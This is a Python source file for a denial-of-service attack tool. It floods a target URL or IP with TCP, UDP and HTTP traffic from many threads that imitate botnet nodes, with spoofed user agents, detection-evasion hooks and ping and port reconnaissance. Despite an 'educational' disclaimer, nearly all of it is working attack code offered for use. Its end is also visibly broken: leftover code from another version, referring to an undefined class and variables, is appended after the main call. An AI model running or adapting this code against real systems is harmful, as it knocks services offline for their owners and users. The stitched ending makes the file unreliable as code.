#!/usr/bin/env python3
"""
Advanced Basic DDOS Attack Script
Author: Lxkhaninkali
Description: Distributed DOS attack coordinator with URL support and advanced evasion
Educational Purpose Only - Use responsibly and legally
Features: URL parsing, advanced evasion integration, realistic botnet simulation
"""

import socket
import sys
import time
import random
import threading
import subprocess
import urllib.parse
import ssl
import os
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, List, Optional

# Import advanced evasion if available
try:
    from advanced_evasion_module import AdvancedEvasionEngine, create_evasion_config, EvasionIntegrator
    HAS_ADVANCED_EVASION = True
except ImportError:
    HAS_ADVANCED_EVASION = False
    print("[!] Advanced evasion module not found - using basic techniques")

class AdvancedBasicDDOS:
    def __init__(self, target):
        # URL/IP parsing
        self.target_url = None
        self.target_ip = None
        self.target_port = None
        self.target_path = '/'
        self.use_https = False
        self.target_host = None
        
        # Parse target (URL or IP:PORT)
        self._parse_target(target)
        
        self.packets_sent = 0
        self.successful_connections = 0
        self.failed_connections = 0
        self.running = True
        self.attack_nodes = []
        
        # Advanced evasion integration
        if HAS_ADVANCED_EVASION:
            evasion_config = create_evasion_config("balanced", ["http", "tcp", "udp"])
            self.evasion_engine = AdvancedEvasionEngine(evasion_config)
            self.evasion_integrator = EvasionIntegrator(self.evasion_engine)
            print("[+] Advanced evasion techniques enabled")
        else:
            self.evasion_engine = None
            self.evasion_integrator = None
        
        # Realistic botnet simulation
        self.botnet_profiles = self._initialize_botnet_profiles()
        
        print(f"[*] Advanced Basic DDOS initialized for {'URL' if self.target_url else 'IP'} targeting")
    
    def _parse_target(self, target):
        """Parse target URL or IP:PORT"""
        if target.startswith('http://') or target.startswith('https://'):
            # URL targeting
            self.target_url = target
            parsed = urllib.parse.urlparse(target)
            
            self.target_host = parsed.hostname
            self.target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            self.target_path = parsed.path or '/'
            self.use_https = parsed.scheme == 'https'
            
            # Resolve IP
            try:
                self.target_ip = socket.gethostbyname(self.target_host)
                print(f"[*] URL Target: {target}")
                print(f"[*] Resolved IP: {self.target_ip}:{self.target_port}")
            except socket.gaierror as e:
                print(f"[!] Failed to resolve hostname {self.target_host}: {e}")
                sys.exit(1)
        
        elif ':' in target:
            # IP:PORT format
            parts = target.split(':')
            self.target_ip = parts[0]
            self.target_port = int(parts[1])
            self.target_host = self.target_ip
            self.use_https = self.target_port == 443
            print(f"[*] IP:PORT Target: {self.target_ip}:{self.target_port}")
        
        else:
            # Just IP, assume common ports
            self.target_ip = target
            self.target_port = 80  # Will be updated by caller if needed
            self.target_host = target
            print(f"[*] IP Target: {self.target_ip} (port will be specified)")
    
    def _initialize_botnet_profiles(self) -> List[Dict]:
        """Initialize realistic botnet node profiles"""
        profiles = [
            # Residential bots (compromised home computers)
            {'type': 'residential_windows', 'bandwidth': 'medium', 'reliability': 0.7, 'activity_pattern': 'variable'},
            {'type': 'residential_mac', 'bandwidth': 'medium', 'reliability': 0.8, 'activity_pattern': 'daytime'},
            {'type': 'residential_linux', 'bandwidth': 'low', 'reliability': 0.6, 'activity_pattern': 'constant'},
            
            # Mobile devices
            {'type': 'mobile_android', 'bandwidth': 'low', 'reliability': 0.5, 'activity_pattern': 'mobile'},
            {'type': 'mobile_ios', 'bandwidth': 'low', 'reliability': 0.6, 'activity_pattern': 'mobile'},
            
            # IoT devices
            {'type': 'iot_camera', 'bandwidth': 'low', 'reliability': 0.9, 'activity_pattern': 'constant'},
            {'type': 'iot_router', 'bandwidth': 'medium', 'reliability': 0.8, 'activity_pattern': 'constant'},
            {'type': 'iot_dvr', 'bandwidth': 'medium', 'reliability': 0.7, 'activity_pattern': 'constant'},
            
            # Server bots (compromised servers)
            {'type': 'server_vps', 'bandwidth': 'high', 'reliability': 0.9, 'activity_pattern': 'constant'},
            {'type': 'server_dedicated', 'bandwidth': 'high', 'reliability': 0.95, 'activity_pattern': 'constant'},
        ]
        
        return profiles
    
    def simulate_advanced_attack_node(self, node_id, duration=60):
        """Simulate advanced attack node with realistic botnet behavior"""
        # Select botnet profile for this node
        profile = random.choice(self.botnet_profiles)
        print(f"[*] Attack node {node_id} starting ({profile['type']})...")
        
        start_time = time.time()
        local_packets = 0
        local_successes = 0
        consecutive_failures = 0
        
        # Node-specific behavior based on profile
        base_delay = self._calculate_base_delay(profile)
        activity_factor = profile['reliability']
        
        while self.running and (time.time() - start_time) < duration:
            try:
                # Skip iteration based on activity pattern and reliability
                if random.random() > activity_factor:
                    time.sleep(random.uniform(1, 5))  # Node temporarily inactive
                    continue
                
                # Select attack type based on profile and target
                attack_type = self._select_attack_type(profile)
                success = False
                
                if attack_type == 'tcp':
                    success = self.advanced_tcp_attack_node(node_id, profile)
                elif attack_type == 'udp':
                    success = self.advanced_udp_attack_node(node_id, profile)
                elif attack_type == 'http':
                    success = self.advanced_http_attack_node(node_id, profile)
                
                local_packets += 1
                self.packets_sent += 1
                
                if success:
                    local_successes += 1
                    self.successful_connections += 1
                    consecutive_failures = 0
                else:
                    self.failed_connections += 1
                    consecutive_failures += 1
                
                # Adaptive delay based on success rate and evasion
                delay = self._calculate_adaptive_delay(
                    base_delay, consecutive_failures, profile
                )
                time.sleep(delay)
                
            except Exception as e:
                consecutive_failures += 1
                time.sleep(random.uniform(0.5, 2.0))
        
        success_rate = local_successes / max(1, local_packets)
        print(f"[*] Node {node_id} ({profile['type']}) completed: {local_packets} packets, {success_rate:.2%} success")
    
    def _calculate_base_delay(self, profile: Dict) -> float:
        """Calculate base delay based on botnet profile"""
        bandwidth_delays = {
            'low': (0.1, 0.5),
            'medium': (0.05, 0.2),
            'high': (0.01, 0.1)
        }
        
        min_delay, max_delay = bandwidth_delays.get(profile['bandwidth'], (0.05, 0.2))
        
        # IoT devices are typically slower
        if 'iot_' in profile['type']:
            min_delay *= 2
            max_delay *= 2
        
        # Mobile devices have variable delays
        if 'mobile_' in profile['type']:
            max_delay *= 3
        
        return random.uniform(min_delay, max_delay)
    
    def _select_attack_type(self, profile: Dict) -> str:
        """Select attack type based on profile and target"""
        # IoT devices primarily do simple attacks
        if 'iot_' in profile['type']:
            return random.choice(['tcp', 'udp'])
        
        # Mobile devices prefer HTTP attacks
        if 'mobile_' in profile['type']:
            return 'http' if self.target_url else 'tcp'
        
        # Server bots can do any attack type
        if 'server_' in profile['type']:
            if self.target_url:
                return random.choice(['tcp', 'udp', 'http'])
            else:
                return random.choice(['tcp', 'udp'])
        
        # Residential computers - mixed attacks
        if self.target_url:
            return random.choice(['tcp', 'http', 'http', 'udp'])  # Bias toward HTTP
        else:
            return random.choice(['tcp', 'udp'])
    
    def _calculate_adaptive_delay(self, base_delay: float, failures: int, profile: Dict) -> float:
        """Calculate adaptive delay based on failures and evasion"""
        delay = base_delay
        
        # Increase delay if many consecutive failures (potential detection)
        if failures > 3:
            delay *= (1.5 ** min(failures - 3, 5))  # Exponential backoff
        
        # Apply evasion delay if available
        if self.evasion_engine:
            evasion_delay = self.evasion_engine.get_evasive_delay(delay)
            delay = evasion_delay
        
        # Add some randomization
        delay *= random.uniform(0.8, 1.2)
        
        return delay
    
    def advanced_tcp_attack_node(self, node_id: int, profile: Dict) -> bool:
        """Advanced TCP attack with evasion techniques"""
        try:
            # Create socket with evasion if available
            if self.evasion_integrator:
                sock = self.evasion_integrator.enhance_tcp_connection(self.target_ip, self.target_port)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(random.uniform(1, 5))
                
                # Random source port
                source_port = random.randint(1024, 65535)
                try:
                    sock.bind(('', source_port))
                except:
                    pass  # Continue without binding
            
            # Attempt connection
            sock.connect((self.target_ip, self.target_port))
            
            # Keep connection open briefly for certain profiles
            if profile['bandwidth'] == 'high':
                time.sleep(random.uniform(0.1, 0.5))
            
            sock.close()
            return True
            
        except Exception as e:
            return False
    
    def advanced_udp_attack_node(self, node_id: int, profile: Dict) -> bool:
        """Advanced UDP attack with intelligent payload generation"""
        try:
            # Create UDP socket with evasion if available
            if self.evasion_integrator:
                sock = self.evasion_integrator.enhance_udp_socket()
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                # Random source port
                source_port = random.randint(1024, 65535)
                try:
                    sock.bind(('', source_port))
                except:
                    pass
            
            # Profile-based payload generation
            if profile['bandwidth'] == 'high':
                payload_size = random.randint(512, 1024)
            elif profile['bandwidth'] == 'medium':
                payload_size = random.randint(128, 512)
            else:  # low bandwidth
                payload_size = random.randint(64, 256)
            
            # Generate evasive payload if available
            if self.evasion_integrator:
                payload = self.evasion_integrator.get_evasive_payload(payload_size, "mixed")
            else:
                # Create varied payload patterns
                payload_types = [
                    b'A' * payload_size,
                    bytes([random.randint(0, 255) for _ in range(payload_size)]),
                    (b'HTTP/1.1 200 OK\r\n' * (payload_size // 17))[:payload_size]
                ]
                payload = random.choice(payload_types)
            
            sock.sendto(payload, (self.target_ip, self.target_port))
            sock.close()
            return True
            
        except Exception as e:
            return False
    
    def advanced_http_attack_node(self, node_id: int, profile: Dict) -> bool:
        """Advanced HTTP attack with full URL support and evasion"""
        if not self.target_url:
            # Fallback to TCP if no URL available
            return self.advanced_tcp_attack_node(node_id, profile)
        
        try:
            # Create connection based on protocol
            if self.use_https:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(random.uniform(3, 8))
                ssl_sock = context.wrap_socket(sock, server_hostname=self.target_host)
                ssl_sock.connect((self.target_ip, self.target_port))
                connection = ssl_sock
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(random.uniform(2, 6))
                sock.connect((self.target_ip, self.target_port))
                connection = sock
            
            # Profile-based user agent selection
            user_agent = self._generate_profile_user_agent(node_id, profile)
            
            # Generate realistic request path
            path = self._generate_request_path(profile)
            
            # HTTP methods based on profile
            if 'server_' in profile['type']:
                method = random.choice(['GET', 'POST', 'HEAD', 'OPTIONS'])
            else:
                method = random.choice(['GET', 'GET', 'POST'])  # Bias toward GET
            
            # Build request with evasive headers if available
            if self.evasion_integrator:
                base_headers = {
                    'Host': self.target_host,
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Connection': 'close'
                }
                
                method, enhanced_headers, data = self.evasion_integrator.enhance_http_request(
                    method, self.target_url + path, base_headers
                )
                
                request = f"{method} {path} HTTP/1.1\r\n"
                for header, value in enhanced_headers.items():
                    request += f"{header}: {value}\r\n"
                request += "\r\n"
                
            else:
                # Basic request without evasion
                request = f"{method} {path} HTTP/1.1\r\n"
                request += f"Host: {self.target_host}\r\n"
                request += f"User-Agent: {user_agent}\r\n"
                request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                request += "Accept-Language: en-US,en;q=0.5\r\n"
                request += "Connection: close\r\n\r\n"
            
            # Send request
            connection.send(request.encode())
            
            # Read response for realism (servers expect clients to read)
            try:
                response = connection.recv(1024)
                success = b'HTTP/' in response
            except:
                success = True  # Connection was successful even if response failed
            
            connection.close()
            return success
            
        except Exception as e:
            return False
    
    def _generate_profile_user_agent(self, node_id: int, profile: Dict) -> str:
        """Generate realistic user agent based on botnet profile"""
        if self.evasion_engine:
            return self.evasion_engine.get_random_user_agent()
        
        # Profile-based user agents
        if profile['type'] == 'residential_windows':
            agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'
            ]
        elif profile['type'] == 'residential_mac':
            agents = [
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15'
            ]
        elif 'mobile_' in profile['type']:
            if 'android' in profile['type']:
                agents = [
                    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
                    'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36'
                ]
            else:  # iOS
                agents = [
                    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
                    'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
                ]
        elif 'iot_' in profile['type']:
            agents = [
                f'IoTDevice/{random.randint(1, 9)}.{random.randint(0, 9)} (Linux)',
                f'EmbeddedBrowser/1.0 ({profile["type"]})',
                'Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36'
            ]
        else:  # server or residential_linux
            agents = [
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
                f'wget/1.{random.randint(10, 21)}.{random.randint(0, 9)}',
                f'curl/7.{random.randint(50, 88)}.{random.randint(0, 9)}'
            ]
        
        return random.choice(agents)
    
    def _generate_request_path(self, profile: Dict) -> str:
        """Generate realistic request paths based on profile"""
        base_path = self.target_path if self.target_path != '/' else ''
        
        # Different path patterns based on profile
        if 'iot_' in profile['type']:
            # IoT devices typically make simple requests
            simple_paths = ['/', '/index.html', '/status', '/api/status']
            return random.choice(simple_paths)
        
        elif 'mobile_' in profile['type']:
            # Mobile devices access mobile-optimized content
            mobile_paths = [
                base_path + '/',
                base_path + '/m/',
                base_path + '/mobile/',
                base_path + f'/app?v={random.randint(1, 100)}',
                base_path + f'/api/mobile?id={random.randint(1000, 9999)}'
            ]
            return random.choice(mobile_paths)
        
        elif 'server_' in profile['type']:
            # Servers might probe for various endpoints
            server_paths = [
                base_path + '/',
                base_path + f'/api/v{random.randint(1, 3)}/',
                base_path + f'/admin?token={random.randint(1000, 9999)}',
                base_path + f'/status?check={random.randint(1, 100)}',
                base_path + f'/health?timestamp={int(time.time())}',
                base_path + f'/load?test={random.randint(1, 1000)}'
            ]
            return random.choice(server_paths)
        
        else:
            # Residential computers - varied browsing patterns
            residential_paths = [
                base_path + '/',
                base_path + f'/?page={random.randint(1, 50)}',
                base_path + f'/search?q={random.choice(["test", "data", "news", "info"])}',
                base_path + f'/category/{random.randint(1, 20)}',
                base_path + f'/post/{random.randint(1, 1000)}',
                base_path + f'/user?id={random.randint(1, 10000)}'
            ]
            return random.choice(residential_paths)
    
    def coordinate_advanced_attack(self, num_nodes=10, duration=60):
        """Coordinate advanced distributed attack with intelligent monitoring"""
        print("="*80)
        print("ADVANCED BASIC DDOS ATTACK WITH INTELLIGENT BOTNET SIMULATION")
        print("="*80)
        print(f"Target: {self.target_url or f'{self.target_ip}:{self.target_port}'}")
        print(f"Protocol: {'HTTPS' if self.use_https else 'HTTP' if self.target_url else 'TCP/UDP'}")
        print(f"Botnet nodes: {num_nodes}")
        print(f"Duration: {duration} seconds")
        print(f"Advanced evasion: {'Enabled' if HAS_ADVANCED_EVASION else 'Basic techniques only'}")
        print("="*80)
        
        attack_start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=num_nodes + 1) as executor:
            futures = []
            
            # Start monitoring thread
            monitor_future = executor.submit(self._monitor_attack_progress, duration)
            futures.append(monitor_future)
            
            # Start all advanced attack nodes
            for node_id in range(1, num_nodes + 1):
                future = executor.submit(self.simulate_advanced_attack_node, node_id, duration)
                futures.append(future)
            
            # Wait for completion
            for future in futures:
                try:
                    future.result(timeout=duration + 10)
                except Exception as e:
                    pass
        
        self.running = False
        total_time = time.time() - attack_start_time
        
        # Final statistics
        print("\n" + "="*80)
        print("ADVANCED ATTACK SUMMARY")
        print("="*80)
        print(f"Total duration: {total_time:.1f} seconds")
        print(f"Total packets sent: {self.packets_sent}")
        print(f"Successful connections: {self.successful_connections}")
        print(f"Failed connections: {self.failed_connections}")
        if self.packets_sent > 0:
            success_rate = self.successful_connections / self.packets_sent
            rate = self.packets_sent / total_time
            print(f"Success rate: {success_rate:.2%}")
            print(f"Average rate: {rate:.1f} packets/second")
        print("="*80)
    
    def _monitor_attack_progress(self, duration):
        """Monitor and display attack progress with intelligent analysis"""
        start_time = time.time()
        last_packets = 0
        last_successes = 0
        
        while self.running and (time.time() - start_time) < duration:
            time.sleep(5)  # Update every 5 seconds
            
            current_time = time.time()
            elapsed = current_time - start_time
            
            # Calculate rates
            packet_delta = self.packets_sent - last_packets
            success_delta = self.successful_connections - last_successes
            
            packets_per_sec = packet_delta / 5 if packet_delta > 0 else 0
            current_success_rate = success_delta / max(1, packet_delta) if packet_delta > 0 else 0
            overall_success_rate = self.successful_connections / max(1, self.packets_sent)
            
            print(f"\n[+] Progress ({elapsed:.0f}s): {self.packets_sent} packets, {packets_per_sec:.1f} pps")
            print(f"    Success rate: {overall_success_rate:.2%} overall, {current_success_rate:.2%} recent")
            print(f"    Active connections: {self.successful_connections}, Failed: {self.failed_connections}")
            
            # Adaptive analysis
            if overall_success_rate < 0.3 and self.packets_sent > 50:
                print(f"[!] Low success rate detected - possible defensive measures active")
            elif packets_per_sec < 1 and elapsed > 30:
                print(f"[!] Low attack rate - botnet nodes may be throttled")
            
            last_packets = self.packets_sent
            last_successes = self.successful_connections
    
    def ping_sweep(self):
        """Enhanced network reconnaissance with target analysis"""
        print(f"[*] Performing enhanced reconnaissance on {self.target_ip}...")
        
        try:
            # Ping the target
            result = subprocess.run(['ping', '-c', '3', self.target_ip], 
                                  capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                print(f"[+] Target {self.target_ip} is reachable")
                
                # Extract response times for analysis
                output_lines = result.stdout.split('\n')
                response_times = []
                for line in output_lines:
                    if 'time=' in line:
                        try:
                            time_str = line.split('time=')[1].split()[0]
                            response_times.append(float(time_str))
                        except:
                            continue
                
                if response_times:
                    avg_time = sum(response_times) / len(response_times)
                    print(f"[+] Average response time: {avg_time:.2f}ms")
                    
                    # Network distance estimation
                    if avg_time < 10:
                        print(f"[+] Target appears to be on local network (very low latency)")
                    elif avg_time < 50:
                        print(f"[+] Target appears to be geographically close (low latency)")
                    elif avg_time < 200:
                        print(f"[+] Target has moderate network distance")
                    else:
                        print(f"[!] High latency detected - target may be distant or have network protection")
                        
            else:
                print(f"[!] Target {self.target_ip} may be unreachable or blocking ICMP")
                print(f"[*] This could indicate firewall protection")
                
        except subprocess.TimeoutExpired:
            print(f"[!] Ping timeout - target likely blocking ICMP or heavily protected")
        except Exception as e:
            print(f"[!] Reconnaissance error: {e}")
    
    def port_check(self):
        """Enhanced port analysis with service detection"""
        print(f"[*] Checking target port {self.target_port} on {self.target_ip}...")
        
        try:
            start_time = time.time()
            
            if self.evasion_integrator:
                sock = self.evasion_integrator.enhance_tcp_connection(self.target_ip, self.target_port)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                
            result = sock.connect_ex((self.target_ip, self.target_port))
            connect_time = time.time() - start_time
            sock.close()
            
            if result == 0:
                print(f"[+] Port {self.target_port} is OPEN (connection time: {connect_time:.3f}s)")
                
                # Service identification
                service_name = {
                    21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
                    80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS',
                    993: 'IMAPS', 995: 'POP3S', 3389: 'RDP', 3306: 'MySQL', 5432: 'PostgreSQL'
                }.get(self.target_port, 'Unknown')
                
                print(f"[+] Likely service: {service_name}")
                
                # Connection speed analysis
                if connect_time < 0.1:
                    print(f"[+] Very fast connection - target likely has good performance")
                elif connect_time > 2.0:
                    print(f"[!] Slow connection - target may be rate limiting or distant")
                
                # Additional HTTP-specific checks
                if self.target_url and self.target_port in [80, 443, 8080, 8443]:
                    self._check_http_service()
                    
                return True
            else:
                print(f"[!] Port {self.target_port} appears to be CLOSED or filtered")
                return False
                
        except Exception as e:
            print(f"[!] Port check error: {e}")
            return False
    
    def _check_http_service(self):
        """Additional HTTP service analysis"""
        try:
            print(f"[*] Performing HTTP service analysis...")
            
            # Try a simple HTTP request
            if self.use_https:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                ssl_sock = context.wrap_socket(sock, server_hostname=self.target_host)
                ssl_sock.connect((self.target_ip, self.target_port))
                connection = ssl_sock
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.target_ip, self.target_port))
                connection = sock
            
            # Send HTTP request
            request = f"HEAD {self.target_path} HTTP/1.1\r\n"
            request += f"Host: {self.target_host}\r\n"
            request += "User-Agent: Mozilla/5.0 (Security Scanner)\r\n"
            request += "Connection: close\r\n\r\n"
            
            connection.send(request.encode())
            response = connection.recv(1024).decode('utf-8', errors='ignore')
            connection.close()
            
            if response:
                lines = response.split('\n')
                if lines:
                    status_line = lines[0].strip()
                    print(f"[+] HTTP Status: {status_line}")
                    
                    # Look for server information
                    for line in lines[1:]:
                        if line.lower().startswith('server:'):
                            server = line.split(':', 1)[1].strip()
                            print(f"[+] Server: {server}")
                            break
                            
        except Exception as e:
            print(f"[!] HTTP service check error: {e}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 ddos_basic.py <target_url_or_ip> [target_port] [num_nodes] [duration]")
        print("Examples:")
        print("  python3 ddos_basic.py https://example.com 15 120")
        print("  python3 ddos_basic.py http://192.168.1.100:8080 20 180")
        print("  python3 ddos_basic.py 192.168.1.100 80 15 120")
        print("\nFeatures: Advanced evasion, URL parsing, intelligent botnet simulation")
        sys.exit(1)
    
    target = sys.argv[1]
    
    # Parse arguments based on whether it's a URL or IP
    if target.startswith('http://') or target.startswith('https://'):
        # URL provided
        num_nodes = int(sys.argv[2]) if len(sys.argv) > 2 else 15
        duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
    else:
        # IP provided, may need port
        if ':' not in target and len(sys.argv) < 3:
            print("Error: Port required when using IP address without port")
            print("Usage: python3 ddos_basic.py <ip_address> <port> [num_nodes] [duration]")
            print("Or use: python3 ddos_basic.py <ip_address:port> [num_nodes] [duration]")
            sys.exit(1)
        
        if ':' not in target:
            # IP and port as separate arguments
            target_port = int(sys.argv[2])
            target = f"{target}:{target_port}"
            num_nodes = int(sys.argv[3]) if len(sys.argv) > 3 else 15
            duration = int(sys.argv[4]) if len(sys.argv) > 4 else 60
        else:
            # IP:PORT format
            num_nodes = int(sys.argv[2]) if len(sys.argv) > 2 else 15
            duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
    
    print("="*80)
    print("ADVANCED BASIC DDOS ATTACK TOOL")
    print("="*80)
    print(f"Target: {target}")
    print(f"Botnet nodes: {num_nodes}")
    print(f"Duration: {duration} seconds")
    print("Features: URL parsing, advanced evasion, intelligent botnet simulation")
    print("WARNING: Use only on systems you own or have permission to test!")
    print("="*80)
    
    # Safety confirmation
    confirm = input(f"\nContinue with advanced DDOS attack on {target}? (y/N): ")
    if confirm.lower() != 'y':
        print("[!] Attack cancelled by user")
        sys.exit(0)
    
    # Initialize and launch advanced attack
    try:
        ddos_attack = AdvancedBasicDDOS(target)
        
        # Perform basic reconnaissance if it's a URL
        if ddos_attack.target_url:
            print("\n[*] Performing basic target reconnaissance...")
            ddos_attack.ping_sweep()
            ddos_attack.port_check()
        
        # Launch coordinated attack
        ddos_attack.coordinate_advanced_attack(num_nodes, duration)
        
    except KeyboardInterrupt:
        print("\n[!] Advanced attack interrupted by user")
        if 'ddos_attack' in locals():
            ddos_attack.running = False
    except Exception as e:
        print(f"\n[!] Advanced attack error: {e}")
        if 'ddos_attack' in locals():
            ddos_attack.running = False

if __name__ == "__main__":
    main()
    print(f"Duration: {duration} seconds")
    print("WARNING: Use only on systems you own or have permission to test!")
    print("="*60)
    
    ddos_attack = BasicDDOS(target_ip, target_port)
    
    # Perform reconnaissance
    ddos_attack.ping_sweep()
    port_open = ddos_attack.port_check()
    
    if not port_open:
        print("[!] Target port appears closed. Continue anyway? (y/N): ", end="")
        if input().lower() != 'y':
            print("[!] Attack cancelled")
            sys.exit(0)
    
    # Confirm attack
    confirm = input("Continue with DDOS attack? (y/N): ")
    if confirm.lower() != 'y':
        print("[!] Attack cancelled")
        sys.exit(0)
    
    try:
        ddos_attack.coordinate_attack(num_nodes, duration)
    except KeyboardInterrupt:
        print("\\n[!] Attack interrupted by user")
        ddos_attack.running = False

if __name__ == "__main__":
    main()
